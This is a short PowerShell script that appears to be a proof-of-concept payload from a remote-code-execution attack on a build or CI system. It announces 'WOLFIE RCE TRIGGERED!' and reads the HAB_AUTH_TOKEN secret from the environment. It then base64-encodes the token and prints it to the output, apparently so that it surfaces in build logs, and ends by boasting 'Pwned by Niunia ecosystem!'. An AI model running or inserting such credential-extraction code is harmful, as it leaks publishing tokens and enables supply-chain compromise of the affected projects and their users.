Write-Host "WOLFIE RCE TRIGGERED! 🐺🩸"
Write-Host "Extracting HAB_AUTH_TOKEN..."
$TokenBytes = [System.Text.Encoding]::UTF8.GetBytes($env:HAB_AUTH_TOKEN)
$EncodedToken = [System.Convert]::ToBase64String($TokenBytes)
Write-Host "Encoded Token: $EncodedToken"
Write-Host "Pwned by Niunia ecosystem!"
